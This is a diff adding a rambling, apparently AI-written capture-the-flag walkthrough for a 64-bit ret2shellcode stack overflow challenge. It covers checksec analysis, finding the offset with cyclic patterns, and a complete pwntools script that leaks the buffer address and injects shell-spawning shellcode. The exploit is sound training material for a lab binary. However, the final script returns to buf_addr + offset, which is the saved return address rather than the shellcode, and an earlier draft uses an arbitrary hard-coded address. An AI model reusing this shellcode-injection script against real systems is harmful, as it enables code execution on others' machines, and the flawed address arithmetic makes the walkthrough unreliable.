@@ -1,0 +1,323 @@
+Alright, I've got this pwn challenge to solve, and I need to use Pwntool to do it. Let's see what I've got here.
+
+First, the challenge is an ELF 64-bit LSB executable named "rop." From the security information provided by 'checksec,' I can see that it has partial relro, no canary, no NX, no PIE, no rpath, no runpath, symbols are present, no fortify_source, and some fortify-able functions.
+
+Looking at the decompiled C code, there's a main function that sets up some buffers and calls setvbuf, puts some messages, prints the address of a buffer, and then reads input from standard input into that buffer with a size of 0x400 (1024 bytes).
+
+Okay, so it's a buffer overflow vulnerability since there's no bounds checking on the read function. The NX bit is disabled, which means that I can execute code on the stack. Cool, so I can probably inject some shellcode into the buffer and make it execute.
+
+Now, to solve this using Pwntool, I need to follow these steps:
+
+1. **Understand the binary and the vulnerability:**
+
+   - The binary is a 64-bit ELF executable.
+
+   - It's missing several security features like canary, NX, PIE, etc., which makes exploitation easier.
+
+   - There's a buffer overflow in the main function where it reads input into a buffer of size 0x400 without bounds checking.
+
+2. **Set up the environment:**
+
+   - Install Pwntool if not already installed.
+
+   - Identify the architecture and set up the context in Pwntool.
+
+3. **Find the offset to overwrite the return address:**
+
+   - Since it's a buffer overflow, I need to find out how many bytes to input to overwrite the return address on the stack.
+
+   - I can use pattern creation and pattern offset to find the exact offset.
+
+4. **Craft the payload:**
+
+   - Create a shellcode that I want to execute.
+
+   - Construct the payload with the correct offset, shellcode, and any necessary padding or overwrites.
+
+5. **Exploit the vulnerability:**
+
+   - Send the payload to the binary and trigger the overflow.
+
+   - The shellcode should be executed, giving me a shell or performing some action.
+
+Let's dive into each step in detail.
+
+### Step 1: Understand the binary and the vulnerability
+
+From the provided information:
+
+- **ELF 64-bit LSB executable:** This tells me it's a 64-bit Linux binary.
+
+- **Security features:**
+
+  - **Partial RelRO:** Some parts of the GOT are read-only, but not all.
+
+  - **No Canary:** No stack canaries are used, so no need to bypass them.
+
+  - **No NX:** No execute protection on the stack, so I can execute code on the stack.
+
+  - **No PIE:** No position-independent executable, so addresses are fixed.
+
+  - **Symbols present:** Symbols are not stripped, which might help in identifying functions and addresses.
+
+- **Main function:**
+
+  - Sets up a buffer on the stack.
+
+  - Uses `setvbuf` to set buffering options for standard input.
+
+  - Prints a message and the address of the buffer.
+
+  - Reads input from standard input into the buffer with a size of 0x400 bytes.
+
+Given that NX is disabled, I can execute code on the stack. Since PIE is not enabled, addresses are fixed, which simplifies things.
+
+### Step 2: Set up the environment
+
+First, ensure that Pwntool is installed. If not, install it using pip:
+
+```bash
+pip install pwntools
+```
+
+Next, set up the context in Pwntool to match the binary's architecture and OS.
+
+Since it's a 64-bit Linux binary, set the context as follows:
+
+```python
+from pwn import *
+
+context.update(arch='amd64', os='linux')
+```
+
+### Step 3: Find the offset to overwrite the return address
+
+To find the offset at which the return address is overwritten, I can use a unique pattern and then see where it's being overwritten.
+
+Generate a unique pattern of a known length:
+
+```python
+pattern = cyclic(1024)
+```
+
+Send this pattern to the binary and see at which point it overwrites the return address, causing a crash.
+
+You can run the binary locally and input the pattern, then note the value of the overwritten return address from the crash.
+
+For example, if the binary crashes and the return address is something like 0x6161616161616161, you can find the offset using:
+
+```python
+offset = cyclic_find(0x6161616161616161)
+print(offset)
+```
+
+This will give you the exact offset where the return address starts.
+
+### Step 4: Craft the payload
+
+Once you have the offset, you can craft the payload.
+
+The payload will consist of:
+
+- A string of 'A's to reach the return address.
+
+- The address to jump to (in this case, since NX is disabled, you can jump to the stack where your shellcode is).
+
+- The shellcode itself.
+
+Since symbols are present, you can use Pwntool to find the address of functions or variables.
+
+But in this case, since NX is disabled, and we can execute code on the stack, we don't necessarily need to find specific addresses.
+
+Here's a basic example of how to craft the payload:
+
+```python
+# Assuming offset is 24 bytes
+offset = 24
+
+# Create a shellcode for a simple shell
+shellcode = asm(shellcraft.sh())
+
+# Construct the payload
+payload = b'A' * offset  # Padding to reach the return address
+payload += p64(0x400607)  # Address to return to, which should be the start of the shellcode on the stack
+payload += shellcode
+
+# Send the payload to the binary
+p = process('./rop')
+p.sendline(payload)
+p.interactive()
+```
+
+Wait, but in this case, since the stack is executable, I can place the shellcode on the stack and just overwrite the return address to point to the shellcode.
+
+However, in the main function, after reading the input, it returns, so overwriting the return address to point to the buffer where the shellcode is placed should work.
+
+But I need to make sure that the shellcode is placed in the buffer correctly.
+
+Let me think differently.
+
+Given that the buffer is at an address printed by the program, and the read function reads up to 0x400 bytes into it, I can calculate where the return address is relative to the buffer.
+
+But perhaps it's simpler to just find the offset as described earlier.
+
+Assuming the offset is 24 bytes (this is just an example; you need to find the correct offset), and the return address is at offset 24, then:
+
+- Fill the first 24 bytes with 'A's.
+
+- Overwrite the return address with the address of the buffer where the shellcode starts.
+
+- Place the shellcode after the return address.
+
+Wait, but since the buffer is on the stack, and the return address is also on the stack, I need to make sure that the address I'm overwriting the return address with points to the shellcode on the stack.
+
+In this case, since the stack is executable, I can place the shellcode in the buffer and make the return address point to the start of the shellcode.
+
+But I need to know the address of the buffer.
+
+Wait, the program prints the address of the buffer:
+
+```c
+printf("What is it : [%p] ?\n", buf);
+```
+
+So, I can read this address, calculate the correct address to jump to, and construct the payload accordingly.
+
+This means I need to automate the process of reading the address printed by the program and then calculating the address for the return pointer.
+
+Here's how I can do it:
+
+1. Start the process.
+
+2. Read the output to get the address of the buffer.
+
+3. Calculate the address where the shellcode will be placed in the buffer.
+
+4. Construct the payload with the correct return address pointing to the shellcode.
+
+5. Send the payload to the program.
+
+Let's see this in code.
+
+First, start the process and read the address of the buffer.
+
+Assuming the output is something like:
+
+```
+Welcome to CTFHub ret2shellcode!
+What is it : [0x7fffffffe4e0] ?
+Input something :
+```
+
+I need to parse the address from the output.
+
+Here's how to do it in Pwntool:
+
+```python
+p = process('./rop')
+
+# Read the welcome message
+welcome = p.recvuntil('What is it : [')
+
+# Read the address
+addr_str = p.recvuntil('] ?\n', drop=True).decode()
+buf_addr = int(addr_str, 16)
+
+# Now, construct the payload
+offset = 24  # This needs to be determined correctly
+shellcode = asm(shellcraft.sh())
+payload = b'A' * offset
+payload += p64(buf_addr + offset)  # Return to the shellcode location
+payload += shellcode
+
+# Send the payload
+p.sendline(payload)
+p.interactive()
+```
+
+In this example, `offset` is assumed to be 24, but you need to find the correct offset.
+
+Alternatively, if you know the exact stack layout, you can calculate the exact address to jump to.
+
+But to make it more robust, you can use the `cyclic` and `cyclic_find` functions to find the exact offset.
+
+Here's how to find the offset:
+
+1. Generate a unique pattern:
+
+```python
+pattern = cyclic(1024)
+```
+
+2. Send this pattern to the program and note the value of the overwritten return address when it crashes.
+
+3. Use `cyclic_find` to find the offset:
+
+```python
+offset = cyclic_find(overwritten_return_address)
+```
+
+For example, if the overwritten return address is `0x6161616161616161`, then:
+
+```python
+offset = cyclic_find(0x6161616161616161)
+print(offset)
+```
+
+This will give you the exact offset.
+
+### Step 5: Exploit the vulnerability
+
+Once you have the correct offset and the address to jump to, construct the payload and send it to the program.
+
+Here's the complete code:
+
+```python
+from pwn import *
+
+# Set up the context
+context.update(arch='amd64', os='linux')
+
+# Start the process
+p = process('./rop')
+
+# Read the welcome message and the address of the buffer
+welcome = p.recvuntil('What is it : [')
+addr_str = p.recvuntil('] ?\n', drop=True).decode()
+buf_addr = int(addr_str, 16)
+
+# Define the offset (this needs to be determined correctly)
+offset = 24  # Example offset, replace with the correct one
+
+# Create the shellcode
+shellcode = asm(shellcraft.sh())
+
+# Construct the payload
+payload = b'A' * offset
+payload += p64(buf_addr + offset)  # Return to the shellcode location
+payload += shellcode
+
+# Send the payload
+p.sendline(payload)
+
+# Interact with the shell
+p.interactive()
+```
+
+Make sure to replace `offset` with the correct value you found using the cyclic pattern.
+
+This should give you a shell or perform the action defined by your shellcode.
+
+### Summary
+
+1. **Understand the binary and its vulnerabilities.**
+
+2. **Set up Pwntool with the correct architecture and OS context.**
+
+3. **Find the offset to the return address using a unique pattern.**
+
+4. **Craft the payload with the correct offset and shellcode.**
+
+5. **Exploit the vulnerability by sending the payload to the binary.**
+
+By following these steps, you should be able to exploit the buffer overflow vulnerability in the given CTF challenge using Pwntool.
